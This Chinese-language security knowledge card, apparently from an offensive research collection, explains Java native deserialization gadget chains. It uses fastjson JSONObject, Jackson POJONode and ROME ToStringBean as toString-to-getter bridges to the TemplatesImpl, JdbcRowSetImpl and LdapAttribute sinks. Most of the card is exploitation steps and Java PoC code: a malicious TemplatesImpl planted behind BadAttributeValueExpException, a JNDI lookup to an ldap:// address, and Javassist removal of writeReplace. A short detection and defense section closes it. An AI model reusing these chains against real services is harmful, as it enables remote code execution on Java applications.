---
id: web-java-deser-special-component-tostring-bridge-sink-compatibility
title: 特殊反序列化组件作 toString 桥的 sink 兼容性：TemplatesImpl 三组件通用、JdbcRowSetImpl 仅 ROME、LdapAttribute 排除 ROME
type: scenario
domain: web
path: web/java/deserialization
technique: special-component-tostring-bridge-sink-compatibility
aliases:
- 特殊反序列化组件攻击原生入口
- JSONObject POJONode ToStringBean 桥
- toString 桥 getter sink 选型
- Rome JdbcRowSetImpl 顺序
- Rome LdapAttribute bad property name
- ToStringBean BeanIntrospector
- 反序列化 getter 兼容性
tags:
- java
- deserialization
- gadget
- tostring
- fastjson
- jackson
- rome
- templatesimpl
- jdbcrowsetimpl
- ldapattribute
- getter
- compatibility
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: ROME < 1.12.0（原文：1.12.0 前可用；1.12.0 起 ToStringBean.toString 改为静态方法、参数由调用方传入，链失效）
verification:
  verified_by: verifier-V676
  verified_at: '2026-11-13T11:58:39+08:00'
  notes: 已对照原文与全部12张截图核对：三桥（JSONObject/POJONode/ToStringBean）toString 反射 getter 骨架、TemplatesImpl 三组件通用（Jackson 删 BaseJsonNode.writeReplace img04 依赖 2.13.3、ROME 用 Templates.class 收窄 getter）、JdbcRowSetImpl 仅 ROME（img05 getter 列表、img06 getDatabaseMetaData 调用栈、Descriptor 顺序来自 HashMap）、LdapAttribute 排除 ROME（img07 get()、img09-11 substring(3) 空属性名→PropertyDescriptor bad property name、img08 rometools 报错栈）、ROME 1.12.0 静态 toString 修复（img12）均与原文一致。修正1处：BAVE 版本边界原文笼统，经本机 javap 核实 JDK11 val=Object、JDK15 val=String（非 String 转 identityHashCode），已将正文 JDK17 起改为 JDK15 起（staging 与 knowledge 同步）。dedup：候选均为单链卡（ROME/Jackson/LdapAttribute 各自链），本卡为跨组件兼容性矩阵与负结论，不属同一利用链，保留。未验证点：未在本机复跑三组件 PoC；ROME+JdbcRowSetImpl 的 getter 顺序依赖环境未复测。
---

## 一句话结论

自实现序列化逻辑的组件（fastjson `JSONObject`、Jackson `POJONode`、ROME `ToStringBean`）在 `toString()` 时都会反射调用被包裹对象的所有 getter，因此可把它们当作原生反序列化链中间的"toString→getter"桥；三个桥对 sink 的兼容性不同：`TemplatesImpl#getOutputProperties` 三者通用（Jackson 需去掉 `BaseJsonNode.writeReplace`、ROME 建议用 `Templates.class` 收窄 getter），`JdbcRowSetImpl#getDatabaseMetaData` 只有 ROME 能打通（getter 调用顺序恰好先命中所需 getter 而不先报错），`LdapAttribute#getAttributeDefinition` 恰恰 ROME 不能用（`BasicAttribute.get()` 导致属性名空串，`PropertyDescriptor` 在收集阶段就抛 `bad property name`），且 ROME 只在 1.12.0 之前可作 gadget。

## 原理

- **桥为什么成立**：这三个组件"序列化对象"的方式都是读对象的 field/getter。`JSONObject.toString()` → `JSON.toJSONString(this)` → 序列化各 value 时反射调用其 getter；`POJONode.toString()` → Jackson 内部序列化 `_value` → 按 JavaBean 约定调用 getter；`ToStringBean.toString(prefix)` → `BeanIntrospector.getPropertyDescriptors(_beanClass)` 取属性描述符，逐个 `pReadMethod.invoke(_obj, NO_PARAMS)`。只要把带危险 getter 的对象（如 `TemplatesImpl`）塞进桥，再把桥交给任意会触发 `toString()` 的原生链入口，就得到"readObject→toString→任意 getter→sink"的通用骨架。
- **原生入口要求链上类 Serializable**：因为走的是 `ObjectInputStream`，桥与被包裹对象都要可序列化；`com.sun.org.apache.bcel.internal.util.ClassLoader` 这类 ClassLoader 体系不是 `Serializable`，所以 fastjson `@type` 常用的 BCEL 链在原生反序列化里用不了。
- **三种可替换入口**：① JDK 自带 `BadAttributeValueExpException.readObject`（无 SecurityManager 时对 `val` 调 `toString()`，JDK8/11 适用；JDK15 起 `val` 字段改为 String，非 String 一律转 `identityHashCode@类名`，需换入口，本机 javap 核实 JDK11 val=Object、JDK15 val=String）；② Spring AOP `HotSwappableTargetSource` + `XString.equals`（`HashMap` 重建时 key 比较 → `HSTS.equals → this.target.equals(other.target)` → `XString.equals` 对参数调 `obj.toString()`）；③ ROME `EqualsBean`/`ObjectBean` 作 `HashMap`/`Hashtable` key（`hashCode → beanHashCode → _obj.toString()`）。入口只负责"把桥 toString 出来"，与桥、sink 正交。
- **TemplatesImpl 三组件通用**：`getOutputProperties()` 是标准 getter，调一次即 `newTransformer()` 加载 `_bytecodes`。Jackson 的 `POJONode` 继承链上有 `BaseJsonNode.writeReplace`，Java 原生序列化会走 writeReplace 写成 Jackson 自己的数据导致报错，需在生成端用 Javassist 删除该方法（`ctClass.removeMethod(ctClass.getDeclaredMethod("writeReplace"))`）。ROME 则建议 `new ToStringBean(Templates.class, tpl)` 用接口收窄 getter 集合（`Templates` 只有一个 `getOutputProperties`），避免遍历到 `getStylesheetDOM`/`getTransletIndex` 等早退。
- **JdbcRowSetImpl 仅 ROME**：`JdbcRowSetImpl` 的 getter 很多，fresh 对象上不少 getter 会抛异常；遍历 getter 是一个接一个来的，中途报错则流程中断，所以 fastjson/Jackson 桥会在到达 `getDatabaseMetaData()` 之前先炸。ROME 能成功是因为 `BeanIntrospector` 返回的属性描述符集合最终来自一个由 `HashMap` 转换的 `Descriptor`（可看作列表），遍历顺序由键哈希决定——实测顺序恰好是 `getQueryTimeout`、`getEscapeProcessing`、`getMaxFieldSize`、**`getDatabaseMetaData()`**……在报错 getter 之前命中；这个顺序依赖 JDK/ROME 的 HashMap 迭代实现，属于"机缘巧合"，换环境需重新验证。`getDatabaseMetaData()→connect()` 在 `dataSource` 非空时 `new InitialContext().lookup(getDataSourceName())`，即 JNDI 注入。
- **LdapAttribute 排除 ROME**：`LdapAttribute`/父类 `BasicAttribute` 有一个无参 `get(): Object`。ROME 的 `BeanIntrospector.getPDs` 对以 `get` 开头的方法取 `getName().substring(3)` 作为属性名，`get` 切出来是空串，`new PropertyDescriptor("", method, null)` 直接抛 `IntrospectionException("bad property name")`；失败发生在**收集 getter 阶段**、根本没进入 `invoke`，所以"多打几次拼 getter 顺序"没用；换成接口 `Attribute` 也仍声明 `get()`，无法规避，因此 ROME 链确定不能结合 `LdapAttribute`。非 ROME 桥（fastjson/Jackson）不受此限，`getAttributeDefinition` 正常被调，效果同 JNDI 注入。
- **ROME 1.12.0 边界**：1.12.0 前 `ToStringBean.toString()` 无参，`beanClass`（决定从哪个类取 getter）与 `obj`（决定调用谁）都来自类属性，可构造传入或反射改；1.12.0 改为 `public static String toString(Class<?> beanClass, Object obj)`，参数由 ROME 内部调用方传入（如 `this.getClass()`、`this`），攻击者无法同时控制两处，链失效。另注意 ROME 1.0 与后续版本属性名带下划线差异（`_obj`/`_beanClass` vs `obj`/`beanClass`）。

## 触发条件

- 存在可控的 Java 原生反序列化入口，入口类可用（BAVE 需 JDK 未设 SecurityManager 且 val 可为对象；HSTS 需 spring-aop；EqualsBean 需 rome）。
- classpath 含所选桥组件：fastjson（≥1.2.49 时桥内目标类还需引用包裹，见关联卡）、jackson-databind、rome（<1.12.0）。
- sink 类可达：JDK 8 的 `TemplatesImpl`/`JdbcRowSetImpl`；`LdapAttribute`（JDK 8 常见）。
- ROME+`JdbcRowSetImpl` 组合需出网到攻击者 LDAP/RMI；`LdapAttribute` 同样需要恶意 LDAP 服务与目标 JDK 允许远程 codebase/本地工厂。
- 反序列化过滤器未拦截桥类和 sink 类。

## 利用步骤

1. 按 classpath 选桥：有 fastjson 用 `JSONObject`；有 Jackson 用 `POJONode`；有 ROME（<1.12.0）用 `ToStringBean`。
2. 按桥选 sink：`TemplatesImpl` 三者皆可；需要出网/不想用字节码时，ROME 选 `JdbcRowSetImpl`（JNDI），fastjson/Jackson 选 `LdapAttribute`（JNDI）；ROME 不要配 `LdapAttribute`，fastjson/Jackson 不要配 `JdbcRowSetImpl`。
3. 组装桥：`JSONObject.put("g", tpl)`；`new POJONode(tpl)`（生成端先删 `BaseJsonNode.writeReplace`）；`new ToStringBean(Templates.class, tpl)` 或 `new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet)`。
4. 选入口承载桥：BAVE 反射写 `val`；或两个 `HotSwappableTargetSource`（一个包桥、一个包 `XString`）放 `HashMap`；或 `EqualsBean(ToStringBean.class, toStringBean)` 作 key。
5. 序列化后发给目标；反序列化时入口 `readObject`/`hashCode` 触发 `toString` → 桥反射 getter → `getOutputProperties` 加载字节码或 `getDatabaseMetaData`/`getAttributeDefinition` 发起 JNDI。
6. 验证：本地看调用栈与出站回连；ROME 版本、JDK 版本、桥的属性名（下划线差异）都要对齐。

## PoC

```java
// 桥 + BAVE 入口（fastjson 桥版；Jackson 用 POJONode 同理）
JSONObject bridge = new JSONObject();
bridge.put("g", tpl); // tpl 为恶意 TemplatesImpl
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
Field val = BadAttributeValueExpException.class.getDeclaredField("val");
val.setAccessible(true);
val.set(poc, bridge);
serialize(poc);
```

```java
// ROME + JdbcRowSetImpl（JNDI）
JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
Field dataSource = BaseRowSet.class.getDeclaredField("dataSource");
dataSource.setAccessible(true);
dataSource.set(jdbcRowSet, "ldap://127.0.0.1:10990/x");
ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
// 反射把 poc.val 设为 toStringBean 后序列化
```

```java
// 删除 POJONode 的 writeReplace（生成端）
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
ctClass.removeMethod(ctClass.getDeclaredMethod("writeReplace"));
ctClass.toClass();
```

（均为原文思路的最小化骨架；未在本机复跑。）

## 变体与关联

- [[web-java-deser-fastjson-badattribute-jsonarray-templatesimpl-native-chain]]：fastjson 桥（JSONArray）+ BAVE + TemplatesImpl 的已验证完整链。
- [[web-java-deser-fastjson-1249-jsonobject-readobject-checkautotype-reference-bypass]]：fastjson ≥1.2.49 时桥内目标类被 `checkAutoType` 拦截的绕过。
- [[jackson-native-deserialization-getter-tostring-templates-rce]] 与 [[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]：Jackson POJONode 桥的具体链与 writeReplace 处理。
- [[web-java-deser-rome-badattribute-tostringbean-templatesimpl]]、[[web-java-deser-rome-equalsbean-tostringbean-templatesimpl]]、[[web-java-deser-rome-objectbean-jdbcrowset-jndi]]、[[web-java-deser-rome-spring-hotswappable-xstring-tostringbean-templatesimpl]]：ROME 桥的四个已验证入口/sink 组合。
- [[web-java-deser-jndi-ldapattribute-getattributedefinition-sink]]、[[web-java-deser-xstring-pojonode-ldapattribute-javaserializeddata]]：LdapAttribute sink 与 Jackson 桥的组合。
- 变体：入口容器 `HashMap` 可换 `Hashtable`（`reconstitutionPut` 同样调 `key.hashCode()`）；ROME 入口 `EqualsBean` 可换 `ObjectBean`；桥的 getter 收窄可换其它只含目标 getter 的接口。
- 边界：ROME ≥1.12.0 失效；ROME+`LdapAttribute` 因 `bad property name` 不可用；fastjson/Jackson+`JdbcRowSetImpl` 因 getter 中途报错不可用；Jackson getter 调用顺序本身不稳定（原文引用外部专门研究，在此不展开），实际利用需按目标版本实测。

## 检测与防御

- 检测：序列化流中出现桥类（`com.alibaba.fastjson.JSONObject`/`JSONArray`、`com.fasterxml.jackson.databind.node.POJONode`、`com.sun.syndication.feed.impl.ToStringBean`/`EqualsBean`/`ObjectBean`）与 sink 类（`TemplatesImpl`、`JdbcRowSetImpl`、`LdapAttribute`）的组合；反序列化线程中出现大量反射 getter 调用与 `BeanIntrospector`/`PropertyDescriptor` 异常（`bad property name` 尤其可疑）；服务端异常 LDAP/RMI 出站。
- 防御：JEP 290 对象图白名单，封禁上述桥类与 sink 类；ROME 升级到 ≥1.12.0；移除未使用的 fastjson/jackson/rome 依赖；JDK 升级并保持 `com.sun.jndi.ldap.object.trustURLCodebase=false`；限制出站 LDAP/RMI；对原生反序列化入口做业务层校验，避免直接 `ObjectInputStream.readObject` 不可信数据。
